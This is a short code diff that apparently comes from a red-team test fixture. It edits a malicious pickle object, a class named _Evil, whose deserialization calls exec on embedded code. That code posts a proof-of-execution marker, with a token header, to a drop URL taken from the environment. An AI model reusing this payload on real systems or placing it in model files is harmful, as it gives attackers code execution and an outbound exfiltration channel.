@@ -22,9 +22,11 @@ class _Evil:
             "import os, urllib.request, json\n"
             "u = os.environ.get('REDSEC_DROP_URL')\n"
             "if u:\n"
-            "    urllib.request.urlopen(u + '/collect/weights', "
+            "    req = urllib.request.Request(u + '/collect/weights', "
             "data=json.dumps({'body': 'WEIGHTSPWN rce-via-pickle-deserialization'})"
-            ".encode(), timeout=5)\n"
+            ".encode(), headers={'X-RedSec-Drop-Token': "
+            "os.environ.get('REDSEC_DROP_TOKEN', '')})\n"
+            "    urllib.request.urlopen(req, timeout=5)\n"
         )
         return (exec, (code,))
 
